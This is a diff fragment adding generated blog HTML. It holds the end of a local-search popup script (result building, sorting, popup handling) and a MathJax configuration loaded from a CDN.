+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+</body>
+</html>
